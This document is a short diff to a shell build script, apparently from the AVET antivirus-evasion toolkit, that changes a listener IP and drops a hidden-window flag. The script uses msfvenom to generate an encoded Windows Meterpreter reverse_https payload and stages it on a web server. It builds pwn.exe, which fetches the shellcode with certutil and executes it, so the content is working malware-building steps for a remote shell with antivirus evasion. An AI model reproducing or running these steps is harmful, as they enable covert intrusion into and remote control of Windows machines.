@@ -6,12 +6,12 @@
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > thepayload.bin
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.56.1 lport=443 -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > thepayload.bin
 # copy file to standart web server dir
 cp thepayload.bin /var/www/html
 # call make_avet, the -l stands for loading and exec shellcode from given file 
 # -d certutil downloads the file from a url, -q hides window
-./make_avet -l -d certutil -q 
+./make_avet -l -d certutil 
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe avet.c
 strip pwn.exe
